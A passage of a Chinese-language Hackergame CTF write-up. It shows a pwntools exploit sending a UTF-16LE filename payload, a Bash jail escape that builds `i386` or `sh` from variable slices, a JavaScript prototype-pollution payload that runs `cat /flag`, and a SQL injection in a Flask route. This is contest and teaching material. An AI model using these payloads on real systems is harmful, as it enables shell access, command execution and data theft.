+└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘
+</code></pre></div>
+<p>我们需要找到一个字符串，它的<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16LE<span class="heti-spacing"> </span></span>编码恰好是这个序列，即每两个字节组成一个<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16<span class="heti-spacing"> </span></span>字符：</p>
+<div class="highlight"><pre><span></span><code>$ echo -ne "Z:\\\\theflag\x00" | hexyl -g 2
+┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
+│00000000│ 5a3a 5c74 6865 666c ┊ 6167 00             │Z:\thefl┊ag⋄     │
+└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
+</code></pre></div>
+<p>这个过程在<span class="heti-skip"><span class="heti-spacing"> </span>Python<span class="heti-spacing"> </span></span>中很好实现：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"Z:</span><span class="se">\\\\</span><span class="s2">theflag</span><span class="se">\x00</span><span class="s2">"</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-16-le"</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_8">利用脚本<a class="headerlink" href="#_8" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="s2">"&lt;your_token&gt;"</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"202.38.93.141"</span><span class="p">,</span> <span class="mi">14202</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"token"</span><span class="p">,</span> <span class="n">token</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"Z:</span><span class="se">\\\\</span><span class="s2">theflag</span><span class="se">\x00</span><span class="s2">"</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-16-le"</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"to it:"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_9">其他<a class="headerlink" href="#_9" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>如果想要正确处理 <code>wchar_t*</code> 字符串转换为 <code>char*</code> 的情景，正确且安全的方式是使用 <code>wcstombs_s</code> 函数。</p>
+<p>例如：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">size_t</span><span class="w"> </span><span class="n">convertedChars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="kt">size_t</span><span class="w"> </span><span class="n">sizeInBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">filename</span><span class="p">.</span><span class="n">length</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
+<span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="w"> </span><span class="n">converted</span><span class="p">(</span><span class="n">sizeInBytes</span><span class="p">);</span>
+
+<span class="n">errno_t</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">wcstombs_s</span><span class="p">(</span>
+<span class="w">    </span><span class="o">&amp;</span><span class="n">convertedChars</span><span class="p">,</span>
+<span class="w">    </span><span class="n">converted</span><span class="p">.</span><span class="n">data</span><span class="p">(),</span>
+<span class="w">    </span><span class="n">sizeInBytes</span><span class="p">,</span>
+<span class="w">    </span><span class="n">filename</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span>
+<span class="w">    </span><span class="n">sizeInBytes</span>
+<span class="p">);</span>
+</code></pre></div>
+<p>参考：</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/cpp/dotnet/how-to-convert-system-string-to-wchar-t-star-or-char-star?view=msvc-170">How to: Convert System::String to wchar_t* or char*</a></li>
+<li><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/wcstombs-s-wcstombs-s-l?view=msvc-170">wcstombs_s, _wcstombs_s_l</a></li>
+</ul>
+<h2 id="general-powerfulshell">[General] PowerfulShell<a class="headerlink" href="#general-powerfulshell" title="Permanent link">¶</a></h2>
+<p>一道<span class="heti-skip"><span class="heti-spacing"> </span>Bash Jail<span class="heti-spacing"> </span></span>类型的题，严格限制了可用字符，所有输入会经过字符检查，如果包含禁用字符则退出，合法输入会被 <code>eval</code> 执行。</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="nv">FORBIDDEN_CHARS</span><span class="o">=</span><span class="s2">"'\";,.%^*?!@#%^&amp;()&gt;&lt;\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"</span>
+
+PowerfulShell<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">'PowerfulShell@hackergame&gt; '</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>!<span class="w"> </span><span class="nb">read</span><span class="w"> </span>input<span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"EOF detected, exiting..."</span>
+<span class="w">            </span><span class="k">break</span>
+<span class="w">        </span><span class="k">fi</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$input</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span><span class="o">[</span><span class="nv">$FORBIDDEN_CHARS</span><span class="o">]</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Not Powerful Enough :)"</span>
+<span class="w">            </span><span class="nb">exit</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">            </span><span class="nb">eval</span><span class="w"> </span><span class="nv">$input</span>
+<span class="w">        </span><span class="k">fi</span>
+<span class="w">    </span><span class="k">done</span>
+<span class="o">}</span>
+
+PowerfulShell
+</code></pre></div>
+<p>关键限制：</p>
+<ul>
+<li>禁用了所有字母<span><span class="heti-spacing"> </span>(</span><code>a-z, A-Z</code><span><span class="heti-spacing"> </span>)</span></li>
+<li>禁用了常用的通配符<span><span class="heti-spacing"> </span>(</span><code>*, ?</code><span><span class="heti-spacing"> </span>)</span></li>
+<li>禁用了引号<span><span class="heti-spacing"> </span>(</span><code>', "</code><span><span class="heti-spacing"> </span>)</span></li>
+<li>禁用了分隔符<span><span class="heti-spacing"> </span>(</span><code>;, .</code><span><span class="heti-spacing"> </span>)</span></li>
+<li>禁用了数字 <code>0</code></li>
+</ul>
+<p>可用字符：</p>
+<ul>
+<li>空格：用于分隔命令</li>
+<li><code>$</code>：变量引用</li>
+<li><code>+-</code>：算术运算</li>
+<li><code>123456789</code>：数字</li>
+<li><code>:</code>：用于字符串操作</li>
+<li><code>=</code>： 赋值操作</li>
+<li><code>[]{}|</code>：用于命令替换和管道</li>
+<li><code>_</code>：下划线</li>
+<li><code>`</code>：命令替换</li>
+<li><code>~</code>：家目录</li>
+</ul>
+<h3 id="_10">非预期解<a class="headerlink" href="#_10" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>在测试各种可用<a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables"><span class="heti-skip"><span class="heti-spacing"> </span>Shell<span class="heti-spacing"> </span></span>变量<span class="heti-skip"><span class="heti-spacing"> </span>(Shell Variables)<span class="heti-spacing"> </span></span></a>和 <a href="https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters">特殊参数<span><span class="heti-spacing"> </span>(Special Parameters)</span></a>，我发现两个变量的值中包含了被禁用的字符：</p>
+<ul>
+<li><code>$-</code>: <code>hB</code></li>
+<li><code>$_</code>: <code>input</code></li>
+</ul>
+<p><code>$-</code> 是<span class="heti-skip"><span class="heti-spacing"> </span>Shell<span class="heti-spacing"> </span></span>选项标志<span><span class="heti-spacing"> </span>(option flags)</span>，<code>h</code> <span>(hashall)<span class="heti-spacing"> </span></span>表示记住命令的位置，<code>B</code> <span>(braceexpand)<span class="heti-spacing"> </span></span>表示启用大括号拓展。</p>
+<p><code>$_</code> 是上一个命令的最后一个参数，即 <code>eval $input</code> 语句中的 <code>input</code>。</p>
+<p>那么我们可以通过字符串切片获得 <code>hBinput</code> 字符任意数量排列组合的命令，例如：</p>
+<ul>
+<li><code>php</code>: <code>${_:2:1}${-::1}${_:2:1}</code></li>
+<li><code>pip</code>: <code>${_:2:1}${_::1}${_:2:1}</code></li>
+<li><code>init</code>: <code>${_::2}${_::1}${_:4:1}</code></li>
+<li><code>h2ph</code>: <code>${-::1}2${_:2:1}${-::1}</code></li>
+</ul>
+<p>可惜靶机环境缺少这些命令，无法直接使用。于是我编写了一个脚本，用来查找本地系统中所有仅由这些可用字符组成的命令，并自动生成对应的构造表达式：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+
+<span class="n">allowed</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="s2">"hBinput123456789-"</span><span class="p">)</span>
+<span class="n">option_flags</span> <span class="o">=</span> <span class="s2">"hB"</span>  <span class="c1"># $-</span>
+<span class="n">last_arg</span> <span class="o">=</span> <span class="s2">"input"</span>  <span class="c1"># $_</span>
+
+
+<span class="k">def</span> <span class="nf">char_to_expr</span><span class="p">(</span><span class="n">c</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">isdigit</span><span class="p">():</span>
+        <span class="k">return</span> <span class="n">c</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">option_flags</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sa">f</span><span class="s2">"$</span><span class="se">{{</span><span class="s2">-:</span><span class="si">{</span><span class="n">option_flags</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s1">''</span><span class="si">}</span><span class="s2">:1</span><span class="se">}}</span><span class="s2">"</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">last_arg</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sa">f</span><span class="s2">"$</span><span class="se">{{</span><span class="s2">_:</span><span class="si">{</span><span class="n">last_arg</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s1">''</span><span class="si">}</span><span class="s2">:1</span><span class="se">}}</span><span class="s2">"</span>
+    <span class="k">return</span> <span class="s2">""</span>
+
+
+<span class="n">commands</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">cmd</span><span class="o">.</span><span class="n">name</span>
+    <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s2">"PATH"</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">Path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">iterdir</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">access</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">X_OK</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">set</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">name</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">allowed</span>
+<span class="p">}</span>
+
+<span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">commands</span><span class="p">):</span>
+    <span class="n">expr</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">char_to_expr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">:</span><span class="se">\t</span><span class="si">{</span><span class="n">expr</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</code></pre></div>
+<p>结果：</p>
+<div class="highlight"><pre><span></span><code>h2ph:   ${-::1}2${_:2:1}${-::1}
+i386:   ${_::1}386
+init:   ${_::1}${_:1:1}${_::1}${_:4:1}
+ip:     ${_::1}${_:2:1}
+php:    ${_:2:1}${-::1}${_:2:1}
+tput:   ${_:4:1}${_:2:1}${_:3:1}${_:4:1}
+</code></pre></div>
+<p><code>tput</code> 是一个用于控制终端输出格式的命令，没有什么用。</p>
+<p><code>i386</code> 是 <code>setarch</code> 命令的符号链接，<code>setarch</code> 包含在<a href="https://github.com/util-linux/util-linux"><span class="heti-skip"><span class="heti-spacing"> </span>util-linux<span class="heti-spacing"> </span></span></a>包中，用于改变程序运行时的系统架构环境。</p>
+<p>例如在<span class="heti-skip"><span class="heti-spacing"> </span>AMD64 (x86_64)<span class="heti-spacing"> </span></span>系统上，运行 <code>i386 command</code> 会使得 <code>command</code> 看到的系统架构是 <code>i686</code> 而不是 <code>x86_64</code>。</p>
+<p>更重要的是，根据<span class="heti-skip"><span class="heti-spacing"> </span>man page<span class="heti-spacing"> </span></span>的说明，如果不指定要运行的程序，<code>setarch</code> 会默认运行 <code>/bin/sh</code>：</p>
+<div class="highlight"><pre><span></span><code>The execution domains currently only affects the output of uname -m.
+For example, on an AMD64 system, running setarch i386 program will
+cause program to see i686 instead of x86_64 as the machine type. It can
+also be used to set various personality options. The default program is
+/bin/sh.
+</code></pre></div>
+<p>这意味着直接运行 <code>i386</code> 命令就能获得一个完整的<span class="heti-skip"><span class="heti-spacing"> </span>shell<span class="heti-spacing"> </span></span>环境：</p>
+<div class="highlight"><pre><span></span><code>PowerfulShell@hackergame&gt; ${_::1}386
+id
+uid=1000(players) gid=1000(players) groups=1000(players)
+</code></pre></div>
+<p>另外：那么为什么会有一个 <code>i386</code> 链接到 <code>setarch</code> 呢？</p>
+<p>在源码的<a href="https://github.com/util-linux/util-linux/blob/4e14b5731efcd703ad13e24362448c87cecb5424/sys-utils/setarch.c#L478-L480"><span class="heti-skip"><span class="heti-spacing"> </span>478-479<span class="heti-spacing"> </span></span>行</a>中写道，如果程序名不是 <code>setarch</code>，就认为是通过符号链接调用的，这时会把程序名当作目标架构名：</p>
+<div class="highlight"><pre><span></span><code><span class="n">archwrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strcmp</span><span class="p">(</span><span class="n">program_invocation_short_name</span><span class="p">,</span><span class="w"> </span><span class="s">"setarch"</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">archwrapper</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">arch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">program_invocation_short_name</span><span class="p">;</span><span class="w">   </span><span class="cm">/* symlinks to setarch */</span>
+</code></pre></div>
+<p>你可以看到系统中还存在其他许多符号链接：</p>
+<div class="highlight"><pre><span></span><code>$ find /usr/bin -type l -lname '*setarch*' 2&gt;/dev/null
+/usr/bin/i386
+/usr/bin/linux32
+/usr/bin/linux64
+/usr/bin/uname26
+/usr/bin/x86_64
+</code></pre></div>
+<h3 id="_11">预期解<a class="headerlink" href="#_11" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>预期解是利用 <code>$HOME</code> 变量值 <code>/players</code> 中的 <code>s</code> 字符，与 <code>$-</code> 变量值 <code>hB</code> 中的 <code>h</code> 组合构造出 <code>sh</code>。</p>
+<p><code>~</code> 会被扩展为 <code>$HOME</code> 变量，所以将 <code>~</code> 赋值给符合<span class="heti-skip"><span class="heti-spacing"> </span>Bash<span class="heti-spacing"> </span></span>命名规则的新变量，再对它进行切片：</p>
+<div class="highlight"><pre><span></span><code><span class="nv">_1</span><span class="o">=</span>~<span class="w">                    </span><span class="c1"># /players</span>
+<span class="nv">_2</span><span class="o">=</span><span class="nv">$-</span><span class="w">                   </span><span class="c1"># hB</span>
+<span class="si">${</span><span class="nv">_1</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_2</span><span class="p">: -2:</span><span class="nv">1</span><span class="si">}</span><span class="w">    </span><span class="c1"># sh</span>
+</code></pre></div>
+<p>直接使用 <code>${~:7:1}</code> 是不行的，比赛中我这里卡了一下，所以放弃了这种解法。</p>
+<p>来看看<span class="heti-skip"><span class="heti-spacing"> </span>AI<span class="heti-spacing"> </span></span>朋友的解释：</p>
+<blockquote>
+<p>在<span class="heti-skip"><span class="heti-spacing"> </span>bash<span class="heti-spacing"> </span></span>中，<code>${parameter:offset:length}</code> 语法用于字符串切片，其中<code>parameter</code><span><span class="heti-spacing"> </span>:</span></p>
+<p>可以是变量名（如<code>$HOME</code><span><span class="heti-spacing"> </span>,</span> <code>$PATH</code>）
+可以是特殊参数（如 <code>$@</code>, <code>$*</code>, <code>$#</code>, <code>$-</code>, <code>$_</code>）
+必须是一个有效的参数引用</p>
+<p><code>~</code> 不是一个变量或参数名，它是一个特殊字符：</p>
+<p>作为命令的第一个字符时，<span>bash<span class="heti-spacing"> </span></span>会将其扩展为 <code>$HOME</code> 的值
+但在参数扩展语法 <code>${...}</code> 中，它不会被识别为一个有效的参数名</p>
+<p>因此需要两步操作：</p>
+<p>先将 <code>~</code> 赋值给一个变量，这时<span class="heti-skip"><span class="heti-spacing"> </span>bash<span class="heti-spacing"> </span></span>会进行扩展，变量获得 <code>$HOME</code> 的值
+然后对这个变量进行切片操作</p>
+</blockquote>
+<h2 id="web-nodejs-is-web-scale">[Web] Node.js is Web Scale<a class="headerlink" href="#web-nodejs-is-web-scale" title="Permanent link">¶</a></h2>
+<p>一个典型的<span class="heti-skip"><span class="heti-spacing"> </span>JavaScript<span class="heti-spacing"> </span></span>原型链污染漏洞。</p>
+<p>预定义命令 <code>cmds</code>，<code>getsource</code> 用于显示源码，<code>test</code> 用于测试：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">cmds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">getsource</span><span class="o">:</span><span class="w"> </span><span class="s2">"cat server.js"</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">test</span><span class="o">:</span><span class="w"> </span><span class="s2">"echo 'hello, world!'"</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>使用对象实现键值存储：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">store</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
+</code></pre></div>
+<p>提供了四个<span><span class="heti-spacing"> </span>API</span>：</p>
+<ul>
+<li><code>GET /api/store</code><span>:<span class="heti-spacing"> </span></span>返回整个存储内容</li>
+<li><code>POST /set</code><span>:<span class="heti-spacing"> </span></span>设置键值对，支持 <code>a.b.c</code> 格式嵌套的<span><span class="heti-spacing"> </span>key</span></li>
+<li><code>GET /get</code><span>:<span class="heti-spacing"> </span></span>获取指定<span class="heti-skip"><span class="heti-spacing"> </span>key<span class="heti-spacing"> </span></span>的<span><span class="heti-spacing"> </span>value</span></li>
+<li><code>GET /execute</code><span>:<span class="heti-spacing"> </span></span>执行预定义命令</li>
+</ul>
+<p>重点关注 <code>/set</code> 里的代码处理逻辑：</p>
+<div class="highlight"><pre><span></span><code><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/set"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">key</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">value</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span><span class="w"> </span><span class="c1">// 从请求体获取 key 和 value</span>
+
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"."</span><span class="p">);</span><span class="w"> </span><span class="c1">// 将 key 按照 . 分割，支持多级属性</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">store</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">current</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">current</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span><span class="w"> </span><span class="c1">// 如果中间节点不存在，创建空对象</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">current</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span><span class="w"> </span><span class="c1">// 移动到下一层</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">current</span><span class="p">[</span><span class="nx">keys</span><span class="p">[</span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">]]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span><span class="w"> </span><span class="c1">// 在最后一个 key 处设置 value</span>
+
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+<span class="w">        </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="s2">"OK"</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div>
+<p>当传入 <code>key=__proto__.newkey</code> 时：</p>
+<ul>
+<li><code>current</code> 初始指向 <code>store</code>，一个空对象</li>
+<li><code>current[__proto__]</code> 会访问对象的原型链上的 <code>Object.prototype</code> 对象</li>
+<li><code>current[__proto__][newkey] = value</code> 会修改<span><span class="heti-spacing"> </span>Object.prototype</span>，从而污染所有继承自该原型的对象</li>
+</ul>
+<p>所以传入以下<span class="heti-skip"><span class="heti-spacing"> </span>Payload<span class="heti-spacing"> </span></span>时：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/set</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="err">{</span>
+    "key": "__proto__.newcmd",
+    "value": "cat /flag"
+}
+</code></pre></div>
+<p>这会使 <code>newcmd</code> 属性被添加到 <code>Object.prototype</code> 上，因此所有以 <code>Object.prototype</code> 为原型的对象（包括 <code>cmds</code> 对象）都能通过原型链访问到这个属性。</p>
+<p>于是可以通过 <code>/execute?cmd=newcmd</code> 来执行命令 <code>cat /flag</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/execute?cmd=newcmd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+<h2 id="web-paolugpt">[Web] PaoluGPT<a class="headerlink" href="#web-paolugpt" title="Permanent link">¶</a></h2>
+<p><code>/view</code> 里将<span class="heti-skip"><span class="heti-spacing"> </span>GET<span class="heti-spacing"> </span></span>参数 <code>conversation_id</code> 直接拼入<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>语句，造成<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入：</p>
+<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/view"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">view</span><span class="p">():</span>
+    <span class="n">conversation_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"conversation_id"</span><span class="p">)</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">execute_query</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">"select title, contents from messages where id = '</span><span class="si">{</span><span class="n">conversation_id</span><span class="si">}</span><span class="s2">'"</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"view.html"</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">Message</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">results</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+</code></pre></div>
+<p>需要注意的是，<code>execute_query</code> 函数默认只获取一条记录：</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">execute_query</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">fetch_all</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">):</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">"file:/tmp/data.db?mode=ro"</span><span class="p">,</span> <span class="n">uri</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">fetch_all</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</code></pre></div>
+<p>题目作者希望先用爬虫脚本解决第一题「千里挑一<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，然后使用<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入解决第二题「窥视未知<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。但如果只用<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入，应该会更容易解决「窥视未知<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，然后才是「千里挑一<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
